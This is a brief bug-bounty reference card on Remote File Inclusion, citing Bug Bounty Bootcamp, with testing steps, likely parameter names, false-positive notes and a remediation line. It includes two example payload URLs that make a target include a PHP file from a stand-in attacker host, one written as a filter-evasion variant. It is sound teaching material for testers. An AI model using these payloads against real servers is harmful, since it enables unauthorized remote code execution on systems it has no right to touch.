# Remote File Inclusion (RFI)

- **What it is:** A server-side include operation accepts a user-controlled remote URL and evaluates the fetched file.
- **Where to look:** Parameters named page, file, include, template, language, path, or similar that choose server-side content.
- **Test / exploitation:**
  - Identify a parameter that changes which server-side file is included.
  - Point it to a harmless remote file you control.
  - Make the remote file produce a benign recognizable result.
  - Request the vulnerable endpoint and confirm that the remote content was executed/included by the target.
  - Use alternate URL forms only if the first form is normalized or blocked.
- **Tools / syntax:**
```text
http://example.com/?page=http://attacker.com/malicious.php
http://example.com/?page=http:attacker.com/malicious.php
```
- **False positives / edge cases:**
  - If the remote file is only fetched or displayed, the issue may be SSRF rather than RFI.
- **Remediation:** Disallow remote includes and use a strict allowlist of local include targets.

## Source: Bug Bounty Bootcamp — The Guide to Finding and Reporting Web Vulnerabilities, Ch. 18
